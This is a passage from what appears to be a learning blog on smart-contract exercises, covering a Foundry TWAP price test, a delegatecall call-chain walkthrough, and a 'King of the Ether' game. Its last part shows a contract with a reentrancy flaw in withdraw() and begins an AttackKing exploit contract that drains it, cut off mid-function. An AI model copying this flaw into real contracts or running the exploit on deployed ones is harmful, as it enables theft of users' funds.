&lt;li&gt;This offers no protection as &lt;code&gt;block.timestamp&lt;&#x2F;code&gt; will have the value of whichever block the txn is inserted into, hence the txn can be held indefinitely by malicious validators.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h1 id=&quot;foundry-task&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#foundry-task&quot; aria-label=&quot;Anchor link for: foundry-task&quot;&gt;Foundry Task&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-4&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-4&quot; aria-label=&quot;Anchor link for: description-4&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The PriceGetter contract is designed to fetch the price conversion rate from DAI to USDC using Uniswap V3&#x27;s price oracle. Contract have dai and usdc token addresses on arbitrum and Time Weighted Average Price (TWAP) as 1800.  The &lt;code&gt;daiToUsdc()&lt;&#x2F;code&gt; function calculates and returns the amount of USDC equivalent to a given amount of DAI.&lt;&#x2F;p&gt;
&lt;p&gt;To install dependencies :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge install uniswap&#x2F;v3-core&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --no-commit
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge install uniswap&#x2F;v3-periphery&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --no-commit
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;initial-test-results&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#initial-test-results&quot; aria-label=&quot;Anchor link for: initial-test-results&quot;&gt;Initial Test Results :&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;internship-tasks&#x2F;Foundry&lt;&#x2F;span&gt;&lt;span&gt; task$ forge test&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -vv --fork-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;rpc.ankr.com&#x2F;arbitrum 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†ë]&lt;&#x2F;span&gt;&lt;span&gt; Compiling...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;No&lt;&#x2F;span&gt;&lt;span&gt; files changed, compilation skipped
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Running&lt;&#x2F;span&gt;&lt;span&gt; 1 test for test&#x2F;PriceGetter.t.sol:PriceGetterTest
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[FAIL.&lt;&#x2F;span&gt;&lt;span&gt; Reason: assertion failed] test_DaiToWant() (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gas:&lt;&#x2F;span&gt;&lt;span&gt; 88731)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Logs:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Error:&lt;&#x2F;span&gt;&lt;span&gt; a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; b not satisfied &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;uint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Value&lt;&#x2F;span&gt;&lt;span&gt; a: 1000497454863863263864864160056
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Value&lt;&#x2F;span&gt;&lt;span&gt; b: 1100000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Test&lt;&#x2F;span&gt;&lt;span&gt; result: FAILED. 0 passed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt; failed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; skipped&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;finished&lt;&#x2F;span&gt;&lt;span&gt; in 14.88s
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ran&lt;&#x2F;span&gt;&lt;span&gt; 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Failing&lt;&#x2F;span&gt;&lt;span&gt; tests:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Encountered&lt;&#x2F;span&gt;&lt;span&gt; 1 failing test in test&#x2F;PriceGetter.t.sol:PriceGetterTest
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[FAIL.&lt;&#x2F;span&gt;&lt;span&gt; Reason: assertion failed] test_DaiToWant() (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gas:&lt;&#x2F;span&gt;&lt;span&gt; 88731)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Encountered&lt;&#x2F;span&gt;&lt;span&gt; a total of 1 failing tests, 0 tests succeeded
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;reason-of-test-fail&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reason-of-test-fail&quot; aria-label=&quot;Anchor link for: reason-of-test-fail&quot;&gt;Reason of test fail&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The price range of the DAI&#x2F;USDC pool is always lies between 0.9 to 1.1. This is because DAI and USDC are both stablecoins, which are designed to maintain a value close to 1 USD. The range of 0.9 to 1.1 is chosen to accommodate minor fluctuations in the price of these stablecoins. If the price of DAI&#x2F;USDC falls outside this range, LPs may choose to remove their liquidity to avoid potential losses.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;assertGt(price, 9 * 10 ** (usdcDecimals - 1))&lt;&#x2F;code&gt; and &lt;code&gt;assertLt(price, 11 * 10 ** (usdcDecimals - 1))&lt;&#x2F;code&gt; lines are assertions to verify that the fetched price is within the expected range.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;That is the fetched prize should be between, &lt;code&gt;900000&lt;&#x2F;code&gt; and &lt;code&gt;1100000&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The price we result is in high precision. We can round the price in terms of &lt;code&gt;usdc&lt;&#x2F;code&gt; by dividing the price with &lt;code&gt;10**(usdcDecimals + daiDecimals)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;function test_DaiToWant() public {
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 price= priceGetter.daiToUsdc(10 ** daiDecimals);
&lt;&#x2F;span&gt;&lt;span&gt;  price = price&#x2F; 10**(usdcDecimals + daiDecimals);
&lt;&#x2F;span&gt;&lt;span&gt;  assertGt(price, 9 * 10 ** (usdcDecimals - 1));  &#x2F;&#x2F; price &amp;gt; 0.9$
&lt;&#x2F;span&gt;&lt;span&gt;  assertLt(price, 11 * 10 ** (usdcDecimals - 1));  &#x2F;&#x2F; price &amp;lt; 1.1$
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;We can also calculate the &lt;code&gt;price&lt;&#x2F;code&gt; by the formula &lt;strong&gt;&lt;code&gt;1.0001 ** tick&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Then the result can be divided by &lt;code&gt;10**6&lt;&#x2F;code&gt; to get the price in &lt;code&gt;USDC&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The above updated test will pass and it ensures the price of usdc is between 0.9 to 1.1.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;internship-tasks&#x2F;Foundry&lt;&#x2F;span&gt;&lt;span&gt; task$ forge test&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -vv --fork-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;rpc.ankr.com&#x2F;arbitrum
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†ë]&lt;&#x2F;span&gt;&lt;span&gt; Compiling...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;No&lt;&#x2F;span&gt;&lt;span&gt; files changed, compilation skipped
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Running&lt;&#x2F;span&gt;&lt;span&gt; 1 test for test&#x2F;PriceGetter.t.sol:PriceGetterTest
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[PASS]&lt;&#x2F;span&gt;&lt;span&gt; test_DaiToWant() (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gas:&lt;&#x2F;span&gt;&lt;span&gt; 23487)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Test&lt;&#x2F;span&gt;&lt;span&gt; result: ok. 1 passed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; failed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; skipped&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;finished&lt;&#x2F;span&gt;&lt;span&gt; in 3.27s
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ran&lt;&#x2F;span&gt;&lt;span&gt; 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;delegatecall&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#delegatecall&quot; aria-label=&quot;Anchor link for: delegatecall&quot;&gt;Delegatecall&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-5&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-5&quot; aria-label=&quot;Anchor link for: description-5&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The DelegateCall.sol consists of four contract &lt;code&gt;Manager&lt;&#x2F;code&gt;, &lt;code&gt;MetaHub&lt;&#x2F;code&gt;, &lt;code&gt;Vault&lt;&#x2F;code&gt; and &lt;code&gt;Controller&lt;&#x2F;code&gt;. Two interfaces which are used to interact with &lt;code&gt;MetaHub&lt;&#x2F;code&gt; and &lt;code&gt;Controller&lt;&#x2F;code&gt;. One &lt;code&gt;Assets&lt;&#x2F;code&gt; library is defined. These contracts makes a complex calls and delegatecalls.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;questions-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#questions-1&quot; aria-label=&quot;Anchor link for: questions-1&quot;&gt;Questions&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol start=&quot;0&quot;&gt;
&lt;li&gt;
&lt;p&gt;Which contract is the entry point?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The entry point of this contract chain is the &lt;code&gt;Manager&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;deposit()&lt;&#x2F;code&gt; function in the &lt;code&gt;Manager&lt;&#x2F;code&gt; contract is the starting point for this contract interaction. When a user calls the deposit function with a specific tokenId, it triggers a call to the deposit function in the &lt;code&gt;Metahub&lt;&#x2F;code&gt; contract and the chain continues.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Where in the code is the &lt;code&gt;onERC721Received&lt;&#x2F;code&gt; function from Vault called? You need to write out the call chain.Where in the code is the &lt;code&gt;onERC721Received&lt;&#x2F;code&gt; function from Vault called? You need to write out the call chain.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;onERC721Received&lt;&#x2F;code&gt; functionis defined inside &lt;code&gt;Vault&lt;&#x2F;code&gt; contract, but it was not called directly.&lt;&#x2F;li&gt;
&lt;li&gt;When we call &lt;code&gt;deposit()&lt;&#x2F;code&gt; function in &lt;code&gt;Manager&lt;&#x2F;code&gt; with a tokenId, it will call the &lt;code&gt;deposit()&lt;&#x2F;code&gt; function of the &lt;code&gt;MetaHub&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;MetaHub&lt;&#x2F;code&gt; contract now calls the &lt;code&gt;transferAssetToVault()&lt;&#x2F;code&gt; function on &lt;code&gt;Assets&lt;&#x2F;code&gt; library.&lt;&#x2F;li&gt;
&lt;li&gt;Then the &lt;code&gt;Assets&lt;&#x2F;code&gt; library will make a &lt;code&gt;delegatecall&lt;&#x2F;code&gt; to the &lt;code&gt;transferAssetToVault()&lt;&#x2F;code&gt; on the &lt;code&gt;Controller&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;Controller&lt;&#x2F;code&gt; contract will call the internal &lt;code&gt;_transferAsset()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;_transferAsset()&lt;&#x2F;code&gt; function will now calls the &lt;code&gt;transferFrom()&lt;&#x2F;code&gt; function of &lt;code&gt;ERC721&lt;&#x2F;code&gt; contract with the &lt;code&gt;to&lt;&#x2F;code&gt; value as the &lt;code&gt;Vault&lt;&#x2F;code&gt; address.&lt;&#x2F;li&gt;
&lt;li&gt;Finally, when the asset sent to the &lt;code&gt;Vault&lt;&#x2F;code&gt; the &lt;code&gt;onERC721Received()&lt;&#x2F;code&gt; will be invoked.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;NOTE&lt;&#x2F;strong&gt;: In openzeppelin ERC721 contract the &lt;code&gt;onERC721Received()&lt;&#x2F;code&gt; onlycalled if we sent asset using &lt;code&gt;safeTransferFrom()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Tx chain : Manager -&amp;gt; MetaHub -&amp;gt; Assets -&amp;gt; Controller -&amp;gt; ERC721 -&amp;gt; Vault.onERC721Received().&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;What are &lt;code&gt;address(this)&lt;&#x2F;code&gt; and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; equal to when Controller.transferAssetToVault is called?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;address(this)&lt;&#x2F;code&gt; will be the &lt;code&gt;MetaHub&lt;&#x2F;code&gt; and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; will be &lt;code&gt;Metahub&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Controller.transferAssetToVault()&lt;&#x2F;code&gt; is called by the &lt;code&gt;Assets&lt;&#x2F;code&gt; library through &lt;code&gt;delegatecall&lt;&#x2F;code&gt;. i.e, &lt;code&gt;msg.sender&lt;&#x2F;code&gt;, &lt;code&gt;address(this)&lt;&#x2F;code&gt; will be maintained from the &lt;code&gt;Assets&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Assets.transferAssetToVault()&lt;&#x2F;code&gt; is called by the &lt;code&gt;MetHub.deposit()&lt;&#x2F;code&gt; with &lt;code&gt;delegatecall&lt;&#x2F;code&gt; because the call is to a library.&lt;&#x2F;li&gt;
&lt;li&gt;So, the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; and &lt;code&gt;address(this)&lt;&#x2F;code&gt; at  &lt;code&gt;Assets.transferAssetToVault()&lt;&#x2F;code&gt; same as values at &lt;code&gt;Controller.transferAssetToVault()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Will &lt;code&gt;require&lt;&#x2F;code&gt; of modifier &lt;code&gt;whenAssetDepositAllowed&lt;&#x2F;code&gt; (Vault contract) be reverted or not? Why?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;require&lt;&#x2F;code&gt; will &lt;strong&gt;not&lt;&#x2F;strong&gt; reverted, because the &lt;code&gt;operator&lt;&#x2F;code&gt; is the &lt;code&gt;_metahub&lt;&#x2F;code&gt; address.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;operator&lt;&#x2F;code&gt; is the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; inside the ERC721 contract.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_msgSender()&lt;&#x2F;code&gt; is the operator that passed to &lt;code&gt;onERC721Received()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;msg.sender&lt;&#x2F;code&gt; in ERC721 is the &lt;code&gt;Metahub&lt;&#x2F;code&gt; contract address. Because the Metahub delegatecalls Controller function which calls the ERC721 contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Will modifier &lt;code&gt;onlyDelegatecall&lt;&#x2F;code&gt; from Controller contract correctly work out? Why?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;onlyDelegatecall&lt;&#x2F;code&gt; modifier is working properly.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;modifier onlyDelegatecall() {
&lt;&#x2F;span&gt;&lt;span&gt;    if (address(this) == __self) revert FunctionMustBeCalledThroughDelegatecall();
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;address(this)&lt;&#x2F;code&gt; when a delegatecall was made from &lt;code&gt;Assets&lt;&#x2F;code&gt; library will be the &lt;code&gt;address(this)&lt;&#x2F;code&gt; inside the &lt;code&gt;Assets&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;So, the &lt;code&gt;address(this)&lt;&#x2F;code&gt; at &lt;code&gt;onlyDelegatecall&lt;&#x2F;code&gt; modifier will be the address of &lt;code&gt;MetaHub&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the &lt;code&gt;address(this)&lt;&#x2F;code&gt; is same as the &lt;code&gt;__self&lt;&#x2F;code&gt; that means no delegatecall was made. So, the modifier will revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;How many contracts are being deployed? Which ones?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Manager, Vault, Controller, MetaHub and already deployed Token contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h1 id=&quot;king-of-the-ether&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#king-of-the-ether&quot; aria-label=&quot;Anchor link for: king-of-the-ether&quot;&gt;King of the Ether&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-6&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-6&quot; aria-label=&quot;Anchor link for: description-6&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The KingOfEther contract is implemented in the way that it is mentioned. Every user is able to send ether to the contracts unti the game is on. The one who stakes most will be the king and he will get 1 ether extra as a reward. And every users will be able to withdraw funds once the game is over.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;KingsOfEther&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract KingOfEther{
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;
&lt;&#x2F;span&gt;&lt;span&gt;    address public king;
&lt;&#x2F;span&gt;&lt;span&gt;    bool public isGameOver;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public startingTime;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping (address =&amp;gt; uint) public stakes;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event King(address, uint);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.value == 1 ether, &amp;quot;Send 1 ether on deployment&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        startingTime = block.timestamp;
&lt;&#x2F;span&gt;&lt;span&gt;        owner = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        isGameOver = false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function depositStake() public payable {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.value &amp;gt; 0, &amp;quot;0 Amount not valid&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(!isGameOver, &amp;quot;Game ended&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        stakes[msg.sender] += msg.value;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(stakes[msg.sender] &amp;gt; stakes[king]){
&lt;&#x2F;span&gt;&lt;span&gt;            king = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;            emit King(king, stakes[king]);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function endGame() public {
&lt;&#x2F;span&gt;&lt;span&gt;        require(block.timestamp &amp;gt; startingTime + 30, &amp;quot;Can&amp;#39;t end now&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(!isGameOver, &amp;quot;Alredy ended&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        stakes[king] += 1 ether;
&lt;&#x2F;span&gt;&lt;span&gt;        isGameOver = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function withdraw() public {
&lt;&#x2F;span&gt;&lt;span&gt;        require(isGameOver, &amp;quot;Game not ended&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(stakes[msg.sender] &amp;gt; 0, &amp;quot;You have no stakes&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success, ) = msg.sender.call{value: stakes[msg.sender]}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;Withdraw Failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        stakes[msg.sender] = 0;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function is vulnerable to Reentrancy as it makes external call before updating the stake value.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;AttackKing&lt;&#x2F;code&gt; contract will exploit the KingOfEther and drains all the ether.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;contract AttackKing{
&lt;&#x2F;span&gt;&lt;span&gt;    KingOfEther public kingContract;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _kingContract) {
&lt;&#x2F;span&gt;&lt;span&gt;        kingContract = KingOfEther(_kingContract);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function deposit() public payable  {
&lt;&#x2F;span&gt;&lt;span&gt;        kingContract.depositStake{value: 1 ether}();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        require(block.timestamp &amp;gt; kingContract.startingTime()+30, &amp;quot;Wait to exploit&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        if(!kingContract.isGameOver()){
&lt;&#x2F;span&gt;&lt;span&gt;            kingContract.endGame();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        kingContract.withdraw();
